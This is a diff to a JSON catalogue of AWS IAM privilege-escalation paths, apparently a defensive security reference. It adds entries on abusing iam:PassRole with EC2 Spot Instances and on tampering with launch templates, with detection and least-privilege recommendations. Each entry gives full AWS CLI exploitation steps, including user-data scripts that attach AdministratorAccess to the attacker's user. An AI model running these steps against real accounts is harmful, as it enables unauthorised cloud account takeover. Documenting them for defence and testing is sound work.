@@ -2646,6 +2646,506 @@
     "filePath": "data/paths/ec2/ec2-002.yaml"
   },
   {
+    "id": "ec2-003",
+    "name": "iam:PassRole + ec2:RequestSpotInstances",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "ec2"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Must have access to a privileged role ARN that trusts ec2.amazonaws.com"
+        },
+        {
+          "permission": "ec2:RequestSpotInstances",
+          "resourceConstraints": "Must be able to request EC2 Spot Instances"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and permissions"
+        },
+        {
+          "permission": "iam:ListInstanceProfiles",
+          "resourceConstraints": "Helpful for finding instance profiles with privileged roles"
+        },
+        {
+          "permission": "ec2:DescribeSpotInstanceRequests",
+          "resourceConstraints": "Useful for verifying spot instance request status and getting instance details"
+        },
+        {
+          "permission": "ec2:DescribeInstances",
+          "resourceConstraints": "Helpful for verifying instance launch and monitoring status"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PassRole` and `ec2:RequestSpotInstances` permissions can escalate privileges by requesting an EC2 Spot Instance with a privileged IAM instance profile. The Spot Instance launches with the privileged role's credentials, which can then be used to execute commands (via user-data scripts) that grant additional permissions to the starting principal. This technique is functionally identical to the standard `ec2:RunInstances` privilege escalation path, but uses Spot Instances instead. Security teams must understand that restricting `ec2:RunInstances` alone is insufficient - they must also restrict `ec2:RequestSpotInstances` to prevent the same attack vector. EC2 Spot Instances are spare compute capacity available at significantly discounted rates (up to 90% off On-Demand prices), making them particularly attractive for attackers executing privilege escalation while minimizing costs.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts ec2.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
+        "The role must have an instance profile associated with it",
+        "A VPC and subnet must be available for launching the Spot Instance"
+      ],
+      "lateral": [
+        "A role must exist that trusts ec2.amazonaws.com to assume it",
+        "The role must have an instance profile associated with it",
+        "A VPC and subnet must be available for launching the Spot Instance"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "# Get the AWS account ID\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\n\n# Find a suitable AMI (Amazon Linux 2023)\nAMI_ID=$(aws ec2 describe-images \\\n    --owners amazon \\\n    --filters \"Name=name,Values=al2023-ami-2023.*-x86_64\" \"Name=state,Values=available\" \\\n    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \\\n    --output text)\n\n# Get default VPC and subnet\nDEFAULT_VPC=$(aws ec2 describe-vpcs --filters \"Name=is-default,Values=true\" --query 'Vpcs[0].VpcId' --output text)\nDEFAULT_SUBNET=$(aws ec2 describe-subnets --filters \"Name=vpc-id,Values=$DEFAULT_VPC\" --query 'Subnets[0].SubnetId' --output text)\n",
+          "description": "Gather necessary information including account ID, AMI, VPC, and subnet for launching the Spot Instance"
+        },
+        {
+          "step": 2,
+          "command": "# Create user-data script to attach AdministratorAccess to starting principal\nUSER_DATA=$(cat <<'EOF'\n#!/bin/bash\nexec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1\necho \"Starting privilege escalation script...\"\n\nSTARTING_USER_NAME=\"YOUR_USERNAME_HERE\"\n\n# Wait for IAM role to be available\nsleep 15\n\n# Attach AdministratorAccess policy to the starting user\naws iam attach-user-policy \\\n  --user-name $STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\necho \"AdministratorAccess attached to $STARTING_USER_NAME successfully\"\nEOF\n)\n\n# Base64 encode the user-data\nUSER_DATA_B64=$(echo \"$USER_DATA\" | base64 | tr -d '\\n')\n",
+          "description": "Prepare a user-data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username."
+        },
+        {
+          "step": 3,
+          "command": "# Create launch specification for the Spot Instance\nLAUNCH_SPEC=$(cat <<EOF\n{\n  \"ImageId\": \"$AMI_ID\",\n  \"InstanceType\": \"t3.micro\",\n  \"IamInstanceProfile\": {\n    \"Name\": \"PRIVILEGED_INSTANCE_PROFILE_NAME\"\n  },\n  \"UserData\": \"$USER_DATA_B64\",\n  \"NetworkInterfaces\": [\n    {\n      \"DeviceIndex\": 0,\n      \"SubnetId\": \"$DEFAULT_SUBNET\",\n      \"AssociatePublicIpAddress\": true\n    }\n  ]\n}\nEOF\n)\n",
+          "description": "Create the launch specification JSON for the Spot Instance request. Replace PRIVILEGED_INSTANCE_PROFILE_NAME with the name of the privileged instance profile you want to pass."
+        },
+        {
+          "step": 4,
+          "command": "# Request the Spot Instance with the privileged instance profile\naws ec2 request-spot-instances \\\n    --spot-price \"0.05\" \\\n    --instance-count 1 \\\n    --type \"one-time\" \\\n    --launch-specification \"$LAUNCH_SPEC\"\n",
+          "description": "Request an EC2 Spot Instance with the privileged instance profile. This uses `iam:PassRole` to assign the privileged role to the Spot Instance."
+        },
+        {
+          "step": 5,
+          "command": "# Monitor the Spot Instance request status\naws ec2 describe-spot-instance-requests \\\n    --spot-instance-request-ids SPOT_REQUEST_ID \\\n    --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' \\\n    --output table\n",
+          "description": "Monitor the Spot Instance request until it is fulfilled. Replace SPOT_REQUEST_ID with the ID from the previous command. Wait until the State is 'active' and Status is 'fulfilled'."
+        },
+        {
+          "step": 6,
+          "command": "# Wait 2-3 minutes for the instance to launch and execute the user-data script\n# Then verify that AdministratorAccess has been attached\naws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE\n",
+          "description": "Wait for the user-data script to execute (typically 2-3 minutes) and verify that the AdministratorAccess policy has been attached to your starting principal."
+        },
+        {
+          "step": 7,
+          "command": "# Verify administrator access by listing IAM users\naws iam list-users\n",
+          "description": "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
+        }
+      ]
+    },
+    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or provide access to sensitive data.\n\nThe attack requires a VPC and subnet to be available for launching the Spot Instance. The user-data script typically takes 2-3 minutes to execute after the instance launches.\n\nThis technique is functionally identical to the standard `ec2:RunInstances` privilege escalation - the only difference is the use of Spot Instances instead of On-Demand instances. Both must be restricted to prevent this attack vector.\n",
+    "recommendation": "Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:\n\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ec2.amazonaws.com\"\n    }\n  }\n}\n\nApply the same security controls to `ec2:RequestSpotInstances` as you would to `ec2:RunInstances`. Both provide equivalent privilege escalation paths and must be restricted together.\n\nImplement Service Control Policies (SCPs) preventing EC2 Spot Instances from being launched with administrative IAM roles.\n\nMonitor CloudTrail for `PassRole` API calls combined with `RequestSpotInstances` events targeting privileged roles. Alert on `AttachUserPolicy` and `PutUserPolicy` API calls, especially when invoked from EC2 instances.\n\nRegularly audit EC2 instances (including Spot Instances) for excessive IAM permissions using IAM Access Analyzer.\n\nUse resource tagging and condition keys to enforce separation of duties between role creation and role assignment.\n\nImplement IAM permission boundaries on users to limit the maximum permissions that can be attached.\n",
+    "discoveredBy": {
+      "name": "Carlos Polop",
+      "organization": "HackTricks"
+    },
+    "references": [
+      {
+        "title": "AWS EC2 Privilege Escalation - HackTricks",
+        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html"
+      },
+      {
+        "title": "AWS Privilege Escalation Methods - Rhino Security Labs",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "ec2-001",
+      "ec2-002"
+    ],
+    "detectionRules": [],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false,
+      "pacu": false,
+      "prowler": false
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "starting-principal",
+          "type": "principal",
+          "description": "The principal with `iam:PassRole` and `ec2:RequestSpotInstances` permissions. Can be an IAM user or role with access to pass a privileged IAM role to an EC2 Spot Instance."
+        },
+        {
+          "id": "spot_instance",
+          "label": "EC2 Spot Instance",
+          "type": "resource",
+          "description": "The EC2 Spot Instance created via `ec2:RequestSpotInstances`. This instance is launched with a privileged IAM instance profile passed via `iam:PassRole`. Spot Instances are spare EC2 capacity available at up to 90% discount, making them cost-effective for attackers."
+        },
+        {
+          "id": "target_role",
+          "label": "target-role",
+          "type": "resource",
+          "description": "The privileged IAM role that the EC2 Spot Instance assumes through its instance profile. The role must trust `ec2.amazonaws.com` to assume it. The permissions of this role determine the attack's effectiveness."
+        },
+        {
+          "id": "userdata_action",
+          "label": "User-data script executes",
+          "type": "action",
+          "color": "#99ccff",
+          "description": "The user-data script runs automatically when the Spot Instance boots, executing with the target-role's credentials. The script attempts to attach the AdministratorAccess policy to the starting principal.\n\nExample user-data script:\n```bash\n#!/bin/bash\naws iam attach-user-policy \\\n  --user-name starting-principal-name \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThe script's success depends on whether the target-role has IAM write permissions.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "If the target-role has IAM write permissions (specifically `iam:AttachUserPolicy` or AdministratorAccess), the user-data script successfully attaches the AdministratorAccess policy to the starting principal. The starting principal now has full administrative access to the AWS account."
+        },
+        {
+          "id": "some_perms",
+          "label": "Limited Escalation Possible",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "If the target-role has some elevated permissions but lacks IAM write permissions, the user-data script fails to attach AdministratorAccess. However, the starting principal may still benefit from:\n- Using the Spot Instance as a pivot point to access resources the role can reach\n- Exfiltrating data the role has access to\n- Exploring additional privilege escalation paths available to the role\n"
+        },
+        {
+          "id": "no_access",
+          "label": "No Effective Escalation",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "If the target-role has minimal or read-only permissions, the user-data script fails to attach any policies, and there are no useful resources to access. No effective privilege escalation occurs, though the Spot Instance will still incur minimal costs."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "spot_instance",
+          "label": "iam:PassRole + ec2:RequestSpotInstances",
+          "description": "The starting principal uses `ec2:RequestSpotInstances` to request an EC2 Spot Instance and `iam:PassRole` to pass a privileged IAM role via an instance profile.\n\nCommand:\n```bash\naws ec2 request-spot-instances \\\n  --spot-price \"0.05\" \\\n  --instance-count 1 \\\n  --type \"one-time\" \\\n  --launch-specification '{\n    \"ImageId\": \"ami-xxxxx\",\n    \"InstanceType\": \"t3.micro\",\n    \"IamInstanceProfile\": {\"Name\": \"privileged-instance-profile\"},\n    \"UserData\": \"base64-encoded-script\"\n  }'\n```\n\nThis creates a Spot Instance request with the privileged role attached.\n"
+        },
+        {
+          "from": "spot_instance",
+          "to": "target_role",
+          "label": "Instance assumes role",
+          "description": "When the Spot Instance launches, it automatically assumes the target-role through the IAM instance profile. The instance's metadata service provides temporary credentials for the role, which are available to any process running on the instance, including the user-data script."
+        },
+        {
+          "from": "target_role",
+          "to": "userdata_action",
+          "label": "User-data script executes on boot",
+          "description": "The user-data script executes automatically during instance initialization, running with the target-role's credentials. The script has full access to all permissions granted to the target-role, allowing it to make AWS API calls to attach policies to the starting principal."
+        },
+        {
+          "from": "userdata_action",
+          "to": "admin",
+          "label": "If role has IAM write permissions",
+          "branch": "A1",
+          "condition": "admin",
+          "description": "If the target-role has `iam:AttachUserPolicy` or equivalent IAM write permissions (such as AdministratorAccess), the user-data script successfully attaches the AdministratorAccess policy to the starting principal, granting full administrative access."
+        },
+        {
+          "from": "userdata_action",
+          "to": "some_perms",
+          "label": "If role has some permissions but not IAM write",
+          "branch": "A2",
+          "condition": "some_permissions",
+          "description": "If the target-role has elevated permissions to access resources (like S3, DynamoDB, Secrets Manager) but lacks IAM write permissions, the user-data script fails to attach AdministratorAccess. However, the starting principal may still pivot through the Spot Instance to access sensitive data or find additional escalation paths."
+        },
+        {
+          "from": "userdata_action",
+          "to": "no_access",
+          "label": "If role has minimal permissions",
+          "branch": "A3",
+          "condition": "no_permissions",
+          "description": "If the target-role only has minimal or read-only permissions, the user-data script fails and there are no useful resources to access. No effective privilege escalation occurs."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2025-10-09T19:58:48Z",
+      "lastUpdated": "2025-11-05T19:56:13Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        }
+      ]
+    },
+    "filePath": "data/paths/ec2/ec2-003.yaml"
+  },
+  {
+    "id": "ec2-004",
+    "name": "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate",
+    "category": "access-resource",
+    "services": [
+      "ec2",
+      "iam"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "ec2:CreateLaunchTemplateVersion",
+          "resourceConstraints": "Must be able to create new versions of existing launch templates"
+        },
+        {
+          "permission": "ec2:ModifyLaunchTemplate",
+          "resourceConstraints": "Must be able to modify launch template default version"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "ec2:DescribeLaunchTemplates",
+          "resourceConstraints": "Helpful for discovering existing launch templates to target"
+        },
+        {
+          "permission": "ec2:DescribeLaunchTemplateVersions",
+          "resourceConstraints": "Useful for viewing existing template configuration including instance profiles"
+        },
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering privileged roles already configured in templates"
+        },
+        {
+          "permission": "iam:ListInstanceProfiles",
+          "resourceConstraints": "Useful for identifying instance profiles with privileged roles"
+        },
+        {
+          "permission": "autoscaling:DescribeAutoScalingGroups",
+          "resourceConstraints": "Helpful for identifying which ASGs use the target launch template"
+        },
+        {
+          "permission": "ec2:DescribeInstances",
+          "resourceConstraints": "Useful for monitoring instance launches and verifying user data execution"
+        },
+        {
+          "permission": "autoscaling:SetDesiredCapacity",
+          "resourceConstraints": "Helpful for triggering instance launches via Auto Scaling Groups"
+        }
+      ]
+    },
+    "description": "A principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions can escalate privileges by modifying an existing launch template that already references a privileged IAM role. The attacker creates a new template version that keeps the existing privileged role reference but injects malicious user data, then sets this version as the default. Crucially, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing a role that already exists in a previous template version. When the next EC2 instance launches from the template (via Auto Scaling Groups, scheduled tasks, or manual launches), it automatically receives the privileged role and executes the malicious user data script, which can grant the attacker persistent administrative access. This is particularly dangerous in environments with auto-scaling policies or scheduled instance launches, where the malicious configuration may activate without any further attacker interaction. EC2 launch templates are commonly used with Auto Scaling Groups to define instance configuration including AMI, instance type, security groups, IAM instance profile, and user data scripts.",
+    "prerequisites": {
+      "admin": [
+        "A launch template must exist that references an IAM role with administrative permissions in a previous version",
+        "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches",
+        "The attacker must be able to trigger or wait for an instance launch from the modified template"
+      ],
+      "lateral": [
+        "A launch template must exist that references an IAM role with some elevated permissions",
+        "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "# Discover existing launch templates\naws ec2 describe-launch-templates \\\n  --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \\\n  --output table\n",
+          "description": "Enumerate existing launch templates to identify targets for modification."
+        },
+        {
+          "step": 2,
+          "command": "# Get template details including instance profile\naws ec2 describe-launch-template-versions \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --versions '$Default' \\\n  --query 'LaunchTemplateVersions[0].LaunchTemplateData'\n",
+          "description": "Inspect the target launch template to identify templates that already have privileged IAM instance profiles configured. Look for templates with admin or elevated instance profiles. Replace lt-xxxxxxxxxxxxx with actual template ID."
+        },
+        {
+          "step": 3,
+          "command": "# Prepare malicious user data script\ncat > user-data.sh <<'EOF'\n#!/bin/bash\nexec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1\necho \"Starting privilege escalation script...\"\n\nSTARTING_USER_NAME=\"YOUR_USERNAME_HERE\"\n\n# Wait for IAM role to be available\nsleep 15\n\n# Attach AdministratorAccess policy to the starting user\naws iam attach-user-policy \\\n  --user-name $STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\necho \"AdministratorAccess attached to $STARTING_USER_NAME successfully\"\nEOF\n\n# Base64 encode the user data\nUSER_DATA_B64=$(cat user-data.sh | base64 | tr -d '\\n')\n",
+          "description": "Prepare a malicious user data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username."
+        },
+        {
+          "step": 4,
+          "command": "# Create a new launch template version with malicious user data\n# Keep the same instance profile from the existing version (no PassRole needed)\naws ec2 create-launch-template-version \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --source-version 1 \\\n  --launch-template-data \"{\n    \\\"IamInstanceProfile\\\": {\n      \\\"Name\\\": \\\"EXISTING_PRIVILEGED_INSTANCE_PROFILE\\\"\n    },\n    \\\"UserData\\\": \\\"$USER_DATA_B64\\\"\n  }\"\n",
+          "description": "Create a new launch template version that references the existing privileged instance profile and includes the malicious user data. Replace lt-xxxxxxxxxxxxx with the target template ID and EXISTING_PRIVILEGED_INSTANCE_PROFILE with the instance profile name found in step 2. Note that this does NOT require iam:PassRole since you're referencing an existing role configuration."
+        },
+        {
+          "step": 5,
+          "command": "# Set the new version as the default\naws ec2 modify-launch-template \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --default-version NEW_VERSION_NUMBER\n",
+          "description": "Modify the launch template to set the malicious version as the default. Replace NEW_VERSION_NUMBER with the version number from step 4. All future instance launches will now use this malicious configuration."
+        },
+        {
+          "step": 6,
+          "command": "# Trigger instance launch (if template is used by an ASG)\naws autoscaling set-desired-capacity \\\n  --auto-scaling-group-name TARGET_ASG_NAME \\\n  --desired-capacity 1\n",
+          "description": "Trigger an instance launch. If the template is used by an Auto Scaling Group, you can increase the desired capacity. Alternatively, wait for auto-scaling events or scheduled instance launches to trigger automatically."
+        },
+        {
+          "step": 7,
+          "command": "# Wait 2-3 minutes, then verify AdministratorAccess was attached\naws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE\n",
+          "description": "Wait for the instance to launch and execute the user data script (typically 2-3 minutes), then verify that AdministratorAccess has been attached to your starting principal."
+        },
+        {
+          "step": 8,
+          "command": "# Verify administrator access\naws iam list-users\n",
+          "description": "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
+        }
+      ]
+    },
+    "limitations": "This path provides administrative access only if the target launch template already references a privileged IAM role with administrative permissions (or at least IAM write permissions like `iam:AttachUserPolicy`). If the existing template only references roles with limited permissions, the user data script may fail to attach policies.\n\nThe attack requires that instances actually launch from the modified template. This could happen through:\n- Auto Scaling Groups that automatically launch instances\n- Scheduled instance launches\n- Manual instance launches by other users\n- Auto-scaling events triggered by CloudWatch alarms\n\nThe attacker may need to wait for these events to occur naturally, or they need additional permissions to trigger instance launches (like `autoscaling:SetDesiredCapacity`).\n\nImportantly, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing an IAM role that already exists in a previous template version. This makes it harder to detect than traditional PassRole-based attacks.\n",
+    "recommendation": "Restrict `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions using resource-based policies to limit which templates can be modified:\n\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"ec2:CreateLaunchTemplateVersion\",\n    \"ec2:ModifyLaunchTemplate\"\n  ],\n  \"Resource\": \"arn:aws:ec2:*:ACCOUNT:launch-template/specific-template-id\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:ResourceTag/Environment\": \"dev\"\n    }\n  }\n}\n\nUse Service Control Policies (SCPs) to prevent launch template modifications in production environments unless from approved automation roles.\n\nMonitor CloudTrail for `CreateLaunchTemplateVersion` and `ModifyLaunchTemplate` API calls, especially on templates that reference privileged instance profiles. Alert when default versions are changed.\n\nPin Auto Scaling Groups to specific launch template versions (e.g., `$Latest` or version number) rather than using `$Default`, preventing automatic use of modified default versions.\n\nMonitor EC2 user data for suspicious IAM-related commands using AWS Config rules or custom Lambda functions that inspect new template versions.\n\nRegularly audit existing launch templates to identify those with privileged instance profiles and restrict modification permissions to only necessary principals.\n\nImplement approval workflows for launch template changes using AWS Service Catalog or custom automation with human approval steps.\n\nEnable MFA requirements for sensitive operations like launch template modifications using `aws:MultiFactorAuthPresent` condition keys.\n\nUse IAM Access Analyzer to identify principals with template modification permissions on templates containing privileged roles.\n\nConsider using EC2 Image Builder with locked-down instance profiles instead of relying on user data for configuration.\n",
+    "discoveredBy": {
+      "name": "Unknown",
+      "organization": "Unknown"
+    },
+    "references": [
+      {
+        "title": "AWS EC2 Launch Templates Documentation",
+        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-launch-templates.html"
+      },
+      {
+        "title": "AWS Privilege Escalation Methods - Rhino Security Labs",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      }
+    ],
+    "relatedPaths": [
+      "ec2-001",
+      "ec2-002",
+      "ec2-003"
+    ],
+    "detectionRules": [],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false,
+      "pacu": false,
+      "prowler": false
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "starting-principal",
+          "type": "principal",
+          "description": "The principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions. Can be an IAM user or role with access to modify existing launch templates."
+        },
+        {
+          "id": "existing_template",
+          "label": "Existing Launch Template",
+          "type": "resource",
+          "description": "An existing EC2 launch template that already references a privileged IAM instance profile in a previous version. The attacker discovers this template and identifies the privileged role configuration to exploit."
+        },
+        {
+          "id": "new_version",
+          "label": "New Template Version (Malicious)",
+          "type": "action",
+          "color": "#ff9999",
+          "description": "The attacker creates a new launch template version using `ec2:CreateLaunchTemplateVersion`. This new version:\n- References the same privileged IAM instance profile from the existing version (no `iam:PassRole` required)\n- Injects malicious user data that will attach AdministratorAccess to the starting principal\n\nExample command:\n```bash\naws ec2 create-launch-template-version \\\n  --launch-template-id lt-xxxxx \\\n  --source-version 1 \\\n  --launch-template-data '{\n    \"IamInstanceProfile\": {\"Name\": \"existing-admin-profile\"},\n    \"UserData\": \"base64-encoded-malicious-script\"\n  }'\n```\n"
+        },
+        {
+          "id": "modified_template",
+          "label": "Modified Template (New Default)",
+          "type": "resource",
+          "description": "The attacker uses `ec2:ModifyLaunchTemplate` to set the malicious version as the default version. All future instance launches from this template will now use the malicious configuration.\n\nCommand:\n```bash\naws ec2 modify-launch-template \\\n  --launch-template-id lt-xxxxx \\\n  --default-version NEW_VERSION_NUMBER\n```\n"
+        },
+        {
+          "id": "instance_launch",
+          "label": "EC2 Instance Launches",
+          "type": "action",
+          "color": "#99ccff",
+          "description": "An EC2 instance launches from the modified template. This could happen through Auto Scaling Groups, scheduled tasks, or manual launches by other users. The instance automatically receives the privileged IAM role and executes the malicious user data script."
+        },
+        {
+          "id": "privileged_role",
+          "label": "Instance assumes privileged-role",
+          "type": "resource",
+          "description": "The launched EC2 instance automatically assumes the privileged IAM role through its instance profile. The instance's metadata service provides temporary credentials for this role, which are available to all processes including the user data script."
+        },
+        {
+          "id": "userdata_action",
+          "label": "User-data script executes",
+          "type": "action",
+          "color": "#99ccff",
+          "description": "The malicious user data script executes automatically during instance initialization, running with the privileged role's credentials. The script attempts to attach the AdministratorAccess policy to the starting principal.\n\nExample script:\n```bash\n#!/bin/bash\naws iam attach-user-policy \\\n  --user-name starting-principal-name \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThe script's success depends on whether the privileged role has IAM write permissions.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "If the privileged role has IAM write permissions (specifically `iam:AttachUserPolicy` or AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal. The starting principal now has full administrative access to the AWS account."
+        },
+        {
+          "id": "some_perms",
+          "label": "Limited Escalation Possible",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "If the privileged role has some elevated permissions but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the attacker may still benefit from:\n- The instance remaining in a modified state that could be exploited later\n- Potential access to resources the role can reach\n- The ability to exfiltrate credentials or data through the instance\n"
+        },
+        {
+          "id": "no_access",
+          "label": "No Effective Escalation",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "If the existing launch template only references a role with minimal or read-only permissions, the user data script fails to attach any policies, and there are no useful resources to access. No effective privilege escalation occurs, though the template remains modified with the malicious configuration."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "existing_template",
+          "label": "ec2:DescribeLaunchTemplates",
+          "description": "The starting principal enumerates existing launch templates to identify targets with privileged IAM instance profiles.\n\nCommand:\n```bash\naws ec2 describe-launch-templates\naws ec2 describe-launch-template-versions \\\n  --launch-template-id lt-xxxxx \\\n  --versions '$Default'\n```\n"
+        },
+        {
+          "from": "existing_template",
+          "to": "new_version",
+          "label": "ec2:CreateLaunchTemplateVersion",
+          "description": "The starting principal creates a new launch template version that references the existing privileged instance profile and includes malicious user data. Crucially, this does NOT require `iam:PassRole` because the attacker is simply referencing a role configuration that already exists in a previous version."
+        },
+        {
+          "from": "new_version",
+          "to": "modified_template",
+          "label": "ec2:ModifyLaunchTemplate",
+          "description": "The starting principal modifies the launch template to set the malicious version as the new default. All future instance launches will use this compromised configuration until the template is restored."
+        },
+        {
+          "from": "modified_template",
+          "to": "instance_launch",
+          "label": "Instance launch triggered",
+          "description": "An EC2 instance launches from the modified template. This could be triggered by the attacker (if they have ASG permissions), by auto-scaling events, by scheduled tasks, or by other users manually launching instances. The attacker may need to wait for these events to occur naturally."
+        },
+        {
+          "from": "instance_launch",
+          "to": "privileged_role",
+          "label": "Instance assumes role via instance profile",
+          "description": "The launched instance automatically assumes the privileged IAM role through its instance profile. The EC2 service provides temporary credentials via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME."
+        },
+        {
+          "from": "privileged_role",
+          "to": "userdata_action",
+          "label": "User data executes on boot",
+          "description": "The malicious user data script executes automatically during instance initialization (typically within 1-2 minutes of launch), running with the privileged role's credentials. The script has full access to all permissions granted to the privileged role."
+        },
+        {
+          "from": "userdata_action",
+          "to": "admin",
+          "label": "If role has IAM write permissions",
+          "branch": "A1",
+          "condition": "admin",
+          "description": "If the privileged role has `iam:AttachUserPolicy` or equivalent IAM write permissions (such as AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal, granting persistent full administrative access."
+        },
+        {
+          "from": "userdata_action",
+          "to": "some_perms",
+          "label": "If role has elevated permissions but not IAM write",
+          "branch": "A2",
+          "condition": "some_permissions",
+          "description": "If the privileged role has elevated permissions to access resources (like S3, DynamoDB, Secrets Manager) but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the modified template persists and could be exploited in other ways, or the instance could be used as a pivot point."
+        },
+        {
+          "from": "userdata_action",
+          "to": "no_access",
+          "label": "If role has minimal permissions",
+          "branch": "A3",
+          "condition": "no_permissions",
+          "description": "If the existing launch template only references a role with minimal or read-only permissions, the user data script fails and there are no useful resources to access. The template remains modified but provides no effective privilege escalation."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/ec2/ec2-004.yaml"
+  },
+  {
     "id": "ec2instanceconnect-003",
     "name": "ec2-instance-connect:SendSSHPublicKey",
     "category": "access-resource",
@@ -6104,6 +6604,870 @@
       ]
     },
     "filePath": "data/paths/iam/iam-014.yaml"
+  },
+  {
+    "id": "iam-015",
+    "name": "iam:AttachUserPolicy + iam:CreateAccessKey",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:AttachUserPolicy",
+          "resourceConstraints": "Must have access to attach policies to the target user"
+        },
+        {
+          "permission": "iam:CreateAccessKey",
+          "resourceConstraints": "Must have permission to create access keys for the target user"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering available users to target"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for retrieving target user details and verifying existence"
+        },
+        {
+          "permission": "iam:ListAttachedUserPolicies",
+          "resourceConstraints": "Helpful for viewing current user permissions before and after modification"
+        },
+        {
+          "permission": "iam:ListAccessKeys",
+          "resourceConstraints": "Useful for checking the number of existing access keys (AWS limit is 2 per user)"
+        },
+        {
+          "permission": "iam:ListPolicies",
+          "resourceConstraints": "Helpful for discovering AWS-managed policies available to attach"
+        }
+      ]
+    },
